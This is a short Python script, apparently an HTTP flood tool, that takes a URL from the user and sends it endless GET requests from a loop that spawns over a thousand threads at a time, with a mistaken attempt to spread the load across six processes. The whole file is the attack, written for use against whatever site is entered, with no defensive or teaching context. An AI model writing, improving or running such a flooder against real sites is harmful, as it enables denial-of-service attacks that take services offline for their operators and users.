import threading as t
import multiprocessing as mp
import requests

if __name__ == '__main__':
    url = input('Enter url : ')
    i = 0
    def send_request(url, i):
        try:
            r = requests.get(url)
            print(f"{i}# {url} : state --> [{r.status_code}]")
        except Exception as e:
            print(">> Exception : "+str(e).split(':')[1])


    def thread():
        while True:
            for i in range(1,1250):
                thraed = t.Thread(target=send_request, args=(url, i,))
                thraed.start()

    p1 = mp.Process(target=thread())
    p2 = mp.Process(target=thread())
    p3 = mp.Process(target=thread())
    p4 = mp.Process(target=thread())
    p5 = mp.Process(target=thread())
    p6 = mp.Process(target=thread())

    p1.start()
    p2.start()
    p3.start()
    p4.start()
    p5.start()
    p6.start()
